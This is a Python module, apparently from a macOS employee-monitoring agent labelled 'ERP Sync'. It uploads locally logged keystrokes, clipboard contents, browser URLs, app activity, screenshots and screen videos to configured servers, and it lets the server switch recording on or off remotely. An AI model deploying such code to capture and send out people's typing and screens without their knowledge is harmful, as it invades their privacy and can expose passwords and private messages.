"""
sync_service.py — macOS version
All-6-Type ERP Sync

FIX (Python 3.9 compatibility):
  str | None  → Optional[str]   (PEP 604 requires Python 3.10+)
  dict | None → Optional[dict]
All other logic is identical to the Windows version.
"""

import os
import threading
import time
import logging
import socket
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

from url import PATH_VIDEO_SETTINGS, PATH_SCREENSHOT_SETTINGS, PATH_MONITORING_SETTINGS
import requests

logger = logging.getLogger(__name__)

DEFAULT_SYNC_INTERVAL = 300
BATCH_JSON            = 50
BATCH_FILES           = 10
BATCH_VIDEOS          = 3
REQUEST_TIMEOUT_JSON  = 10
REQUEST_TIMEOUT_FILE  = 60


class SyncService:
    def __init__(self, db_manager, config_manager):
        self.db_manager          = db_manager
        self.config_manager      = config_manager
        self.is_running          = False
        self.thread: Optional[threading.Thread] = None
        self._fallback_hostname  = socket.gethostname()
        self._last_sync_time:  Optional[str] = None   # FIX: was str | None
        self._last_sync_error: Optional[str] = None   # FIX: was str | None
        self._is_syncing:      bool           = False

    # ─── IDENTITY ────────────────────────────────────────────────────────────

    def _get_identity(self) -> dict:
        try:
            config = self.db_manager.get_identity_config()
            mac_address = ""
            try:
                import uuid
                mac_address = ':'.join('{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in reversed(range(0, 8 * 6, 8)))
            except Exception:
                pass
            return {
                "pcName":     config.get("device_alias") or self._fallback_hostname,
                "macAddress": mac_address,
                "userName":   config.get("user_alias") or config.get("os_user", ""),
            }
        except Exception as e:
            logger.warning("Could not read identity config: %s — using fallback", e)
            return {
                "pcName":     self._fallback_hostname,
                "macAddress": "",
                "userName":   "",
            }

    # ─── LIFECYCLE ───────────────────────────────────────────────────────────

    def start(self) -> None:
        if self.is_running:
            return
        self.is_running = True
        self.thread = threading.Thread(target=self._sync_loop, daemon=True)
        self.thread.start()
        logger.info("SyncService v2 started — 6 data types enabled")

    def stop(self) -> None:
        self.is_running = False
        if self.thread:
            self.thread.join(timeout=5)
        logger.info("SyncService stopped")

    def get_status(self) -> dict:
        return {
            "last_sync":  self._last_sync_time,
            "last_error": self._last_sync_error,
            "is_syncing": self._is_syncing,
        }

    def trigger_sync_now(self) -> dict:
        logger.info("Manual sync triggered")
        try:
            self._is_syncing = True
            identity = self._get_identity()
            results = {
                "app_activity": self._sync_app_activity(identity),
                "browser":      self._sync_browser(identity),
                "clipboard":    self._sync_clipboard(identity),
                "keystrokes":   self._sync_keystrokes(identity),
                "screenshots":  self._sync_screenshots(identity),
                "videos":       self._sync_videos(identity),
            }
            self._last_sync_time  = datetime.now(timezone.utc).isoformat()
            self._last_sync_error = None
            return {"success": True, "synced": results}
        except Exception as e:
            self._last_sync_error = str(e)
            logger.error("Manual sync failed: %s", e)
            return {"success": False, "error": str(e)}
        finally:
            self._is_syncing = False

    # ─── MAIN LOOP ───────────────────────────────────────────────────────────

    def _sync_loop(self) -> None:
        time.sleep(30)
        while self.is_running:
            try:
                self._is_syncing = True
                identity = self._get_identity()
                self._sync_video_status(identity)
                self._sync_screenshot_status(identity)
                self._sync_overall_status(identity)
                self._sync_app_activity(identity)
                self._sync_browser(identity)
                self._sync_clipboard(identity)
                self._sync_keystrokes(identity)
                self._sync_screenshots(identity)
                self._sync_videos(identity)
                self._last_sync_time  = datetime.now(timezone.utc).isoformat()
                self._last_sync_error = None
            except Exception as e:
                self._last_sync_error = str(e)
                logger.error("Sync loop error: %s", e)
            finally:
                self._is_syncing = False

            interval = int(
                self.config_manager.get("sync_interval_seconds", DEFAULT_SYNC_INTERVAL)
            )
            for _ in range(interval):
                if not self.is_running:
                    return
                time.sleep(1)

    # ─── SHARED HTTP HELPERS ─────────────────────────────────────────────────

    def _auth_headers(self) -> dict:
        api_key = self.config_manager.get("api_key", "").strip()
        headers = {"Accept": "application/json"}
        if api_key:
            headers["X-API-Key"] = api_key
        return headers

    def _get_url(self, key: str) -> Optional[str]:
        url = self.config_manager.get(key, "").strip()
        return url if url else None

    def _post_json(self, url: str, payload: dict) -> bool:
        try:
            resp = requests.post(
                url,
                json=payload,
                headers={**self._auth_headers(), "Content-Type": "application/json"},
                timeout=REQUEST_TIMEOUT_JSON,
            )
            if resp.ok:
                return True
            logger.warning("JSON POST %s → HTTP %d: %s", url, resp.status_code, resp.text[:200])
            return False
        except requests.exceptions.Timeout:
            logger.error("JSON POST %s timed out", url)
            return False
        except Exception as e:
            logger.error("JSON POST %s failed: %s", url, e)
            return False

    def _post_file(self, url: str, fields: dict, file_path: str) -> bool:
        try:
            with open(file_path, "rb") as f:
                filename = Path(file_path).name
                files = {"file": (filename, f, "application/octet-stream")}
                resp = requests.post(
                    url,
                    data=fields,
                    files=files,
                    headers=self._auth_headers(),
                    timeout=REQUEST_TIMEOUT_FILE,
                )
            if resp.ok:
                return True
            logger.warning("File POST %s → HTTP %d: %s", url, resp.status_code, resp.text[:200])
            return False
        except FileNotFoundError:
            logger.warning("File not found for upload: %s — marking as synced anyway", file_path)
            return True
        except requests.exceptions.Timeout:
            logger.error("File POST %s timed out", url)
            return False
        except Exception as e:
            logger.error("File POST %s failed: %s", url, e)
            return False

    def _normalize_timestamp(self, ts: str) -> str:
        if not ts:
            return datetime.now(timezone.utc).isoformat()
        try:
            dt = datetime.fromisoformat(ts)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return dt.isoformat()
        except Exception:
            return ts

    # ─── TYPE 1 — APP ACTIVITY ───────────────────────────────────────────────

    def _sync_app_activity(self, identity: dict) -> int:
        url = self._get_url("url_app_activity")
        if not url:
            return 0

        records = self.db_manager.get_unsynced_app_activity(limit=BATCH_JSON)
        if not records:
            return 0

        synced_ids = []
        for rec in records:
            payload = self._build_app_activity_payload(rec, identity)
            if payload is None:
                continue
            if self._post_json(url, payload):
                synced_ids.append(rec["id"])
            else:
                break

        if synced_ids:
            self.db_manager.mark_as_synced("app_activity", synced_ids)
            logger.info("app_activity: synced %d records", len(synced_ids))
        return len(synced_ids)

    def _build_app_activity_payload(self, rec: dict, identity: dict) -> Optional[dict]:  # FIX: was dict | None
        try:
            start_dt = datetime.fromisoformat(rec["timestamp"])
            if start_dt.tzinfo is None:
                start_dt = start_dt.replace(tzinfo=timezone.utc)
            duration = int(rec.get("duration_seconds") or 0)
            end_dt   = start_dt + timedelta(seconds=duration)
            return {
                "pcName":       identity["pcName"],
                "macAddress":   identity["macAddress"],
                "userName":     identity["userName"],
                "appName":      rec.get("app_name") or "Unknown",
                "windowsTitle": rec.get("window_title") or "",
                "startTime":    start_dt.isoformat(),
                "endTime":      end_dt.isoformat(),
                "duration":     duration,
                "syncTime":     datetime.now(timezone.utc).isoformat(),
            }
        except Exception as e:
            logger.error("_build_app_activity_payload id=%s: %s", rec.get("id"), e)
            return None

    # ─── TYPE 2 — BROWSER ACTIVITY ───────────────────────────────────────────

    def _sync_browser(self, identity: dict) -> int:
        url = self._get_url("url_browser")
        if not url:
            return 0

        records = self.db_manager.get_unsynced_browser(limit=BATCH_JSON)
        if not records:
            return 0

        synced_ids = []
        for rec in records:
            payload = {
                "pcName":      identity["pcName"],
                "macAddress":  identity["macAddress"],
                "userName":    identity["userName"],
                "browserName": rec.get("browser_name") or "",
                "url":         rec.get("url") or "",
                "pageTitle":   rec.get("page_title") or "",
                "timestamp":   self._normalize_timestamp(rec.get("timestamp") or ""),
                "syncTime":    datetime.now(timezone.utc).isoformat(),
            }
            if self._post_json(url, payload):
                synced_ids.append(rec["id"])
            else:
                break

        if synced_ids:
            self.db_manager.mark_as_synced("browser_activity", synced_ids)
            logger.info("browser_activity: synced %d records", len(synced_ids))
        return len(synced_ids)

    # ─── TYPE 3 — CLIPBOARD ──────────────────────────────────────────────────

    def _sync_clipboard(self, identity: dict) -> int:
        url = self._get_url("url_clipboard")
        if not url:
            return 0

        records = self.db_manager.get_unsynced_clipboard(limit=BATCH_JSON)
        if not records:
            return 0

        synced_ids = []
        for rec in records:
            payload = {
                "pcName":         identity["pcName"],
                "macAddress":     identity["macAddress"],
                "userName":       identity["userName"],
                "contentType":    rec.get("content_type") or "text",
                "contentPreview": rec.get("content_preview") or "",
                "timestamp":      self._normalize_timestamp(rec.get("timestamp") or ""),
                "syncTime":       datetime.now(timezone.utc).isoformat(),
            }
            if self._post_json(url, payload):
                synced_ids.append(rec["id"])
            else:
                break

        if synced_ids:
            self.db_manager.mark_as_synced("clipboard_events", synced_ids)
            logger.info("clipboard_events: synced %d records", len(synced_ids))
        return len(synced_ids)

    # ─── TYPE 4 — KEYSTROKES ─────────────────────────────────────────────────

    def _sync_keystrokes(self, identity: dict) -> int:
        url = self._get_url("url_keystrokes")
        if not url:
            return 0

        records = self.db_manager.get_unsynced_keystrokes(limit=BATCH_JSON)
        if not records:
            return 0

        synced_ids = []
        for rec in records:
            payload = {
                "pcName":      identity["pcName"],
                "macAddress":  identity["macAddress"],
                "userName":    identity["userName"],
                "application": rec.get("application") or "",
                "windowTitle": rec.get("window_title") or "",
                "content":     rec.get("content") or "",
                "timestamp":   self._normalize_timestamp(rec.get("timestamp") or ""),
                "syncTime":    datetime.now(timezone.utc).isoformat(),
            }
            if self._post_json(url, payload):
                synced_ids.append(rec["id"])
            else:
                break

        if synced_ids:
            self.db_manager.mark_as_synced("text_logs", synced_ids)
            logger.info("keystrokes: synced %d records", len(synced_ids))
        return len(synced_ids)

    # ─── TYPE 5 — SCREENSHOTS ────────────────────────────────────────────────

    def _sync_screenshots(self, identity: dict) -> int:
        url = self._get_url("url_screenshots")
        if not url:
            return 0

        records = self.db_manager.get_unsynced_screenshots(limit=BATCH_FILES)
        if not records:
            return 0

        synced_ids = []
        for rec in records:
            file_path = rec.get("file_path") or ""
            fields = {
                "pcName":      identity["pcName"],
                "macAddress":  identity["macAddress"],
                "userName":    identity["userName"],
                "activeApp":   rec.get("active_app") or "",
                "activeWindow": rec.get("active_window") or "",
                "timestamp":   self._normalize_timestamp(rec.get("timestamp") or ""),
                "syncTime":    datetime.now(timezone.utc).isoformat(),
            }
            if self._post_file(url, fields, file_path):
                synced_ids.append(rec["id"])
            else:
                break

        if synced_ids:
            self.db_manager.mark_as_synced("screenshots", synced_ids)
            logger.info("screenshots: synced %d records", len(synced_ids))
        return len(synced_ids)

    # ─── TYPE 6 — VIDEOS ─────────────────────────────────────────────────────

    def _sync_videos(self, identity: dict) -> int:
        url = self._get_url("url_videos")
        if not url:
            return 0

        records = self.db_manager.get_unsynced_videos(limit=BATCH_VIDEOS)
        if not records:
            return 0

        synced_ids = []
        for rec in records:
            file_path = rec.get("file_path") or ""
            fields = {
                "pcName":          identity["pcName"],
                "macAddress":      identity["macAddress"],
                "userName":        identity["userName"],
                "timestamp":       self._normalize_timestamp(rec.get("timestamp") or ""),
                "durationSeconds": int(rec.get("duration_seconds") or 0),
                "syncTime":        datetime.now(timezone.utc).isoformat(),
            }
            if self._post_file(url, fields, file_path):
                synced_ids.append(rec["id"])
            else:
                break

        if synced_ids:
            self.db_manager.mark_as_synced("video_recordings", synced_ids)
            logger.info("videos: synced %d records", len(synced_ids))
        return len(synced_ids)

    def _sync_video_status(self, identity: dict) -> None:
        url = self.config_manager.get("url_video_settings", "").strip()
        if not url:
            base_url = self.config_manager.get("base_url", "").strip()
            if not base_url:
                return
            url = f"{base_url.rstrip('/')}{PATH_VIDEO_SETTINGS}"
        
        url = f"{url}?pcName={identity['pcName']}&macAddress={identity['macAddress']}&userName={identity['userName']}"
        try:
            resp = requests.get(
                url, headers=self._auth_headers(), timeout=10
            )
            if resp.ok:
                data = resp.json()
                remote_enabled = data.get("recordingEnabled")
                if remote_enabled is not None:
                    local_enabled = self.config_manager.get("recording_enabled", False)
                    if bool(remote_enabled) != bool(local_enabled):
                        self.config_manager.set("recording_enabled", bool(remote_enabled))
                        from api_server import screen_recorder
                        if remote_enabled:
                            screen_recorder.start()
                            logger.info("Screen recording ENABLED by remote server sync")
                        else:
                            screen_recorder.stop()
                            logger.info("Screen recording DISABLED by remote server sync")
        except Exception as e:
            logger.debug("Failed to sync video status from remote: %s", e)

    def _sync_screenshot_status(self, identity: dict) -> None:
        url = self.config_manager.get("url_screenshot_settings", "").strip()
        if not url:
            base_url = self.config_manager.get("base_url", "").strip()
            if not base_url:
                return
            url = f"{base_url.rstrip('/')}{PATH_SCREENSHOT_SETTINGS}"
            
        url = f"{url}?pcName={identity['pcName']}&macAddress={identity['macAddress']}&userName={identity['userName']}"
        try:
            resp = requests.get(
                url, headers=self._auth_headers(), timeout=10
            )
            if resp.ok:
                data = resp.json()
                remote_enabled = data.get("screenshotEnabled")
                if remote_enabled is not None:
                    local_enabled = self.config_manager.get("screenshot_enabled", True)
                    if bool(remote_enabled) != bool(local_enabled):
                        self.config_manager.set("screenshot_enabled", bool(remote_enabled))
                        from api_server import screenshot_monitor
                        if remote_enabled:
                            screenshot_monitor.start()
                            logger.info("Screenshot capturing ENABLED by remote server sync")
                        else:
                            screenshot_monitor.stop()
                            logger.info("Screenshot capturing DISABLED by remote server sync")
        except Exception as e:
            logger.debug("Failed to sync screenshot status from remote: %s", e)

    def _sync_overall_status(self, identity: dict) -> None:
        url = self.config_manager.get("url_monitoring_settings", "").strip()
        if not url:
            base_url = self.config_manager.get("base_url", "").strip()
            if not base_url:
                return
            url = f"{base_url.rstrip('/')}{PATH_MONITORING_SETTINGS}"
            
        url = f"{url}?pcName={identity['pcName']}&macAddress={identity['macAddress']}&userName={identity['userName']}"
        try:
            resp = requests.get(
                url, headers=self._auth_headers(), timeout=10
            )
            if resp.ok:
                data = resp.json()
                remote_active = data.get("monitoringActive")
                if remote_active is not None:
                    # Trigger the local API to ensure all monitors are correctly handled.
                    # This is cleaner than importing monitoring_active directly which might be tricky in the sync thread.
                    api_port = self.config_manager.get("api_port", 5000)
                    token = self.config_manager.get("admin_token", "")
                    headers = {"Authorization": f"Bearer {token}"} if token else {}
                    
                    if remote_active:
                        logger.info("Monitoring RESUMED by remote server sync")
                        requests.post(f"http://127.0.0.1:{api_port}/api/monitoring/resume", 
                                      headers=headers, timeout=5)
                    else:
                        logger.info("Monitoring PAUSED by remote server sync")
                        requests.post(f"http://127.0.0.1:{api_port}/api/monitoring/pause", 
                                      headers=headers, timeout=5)
        except Exception as e:
            logger.debug("Failed to sync overall monitoring status from remote: %s", e)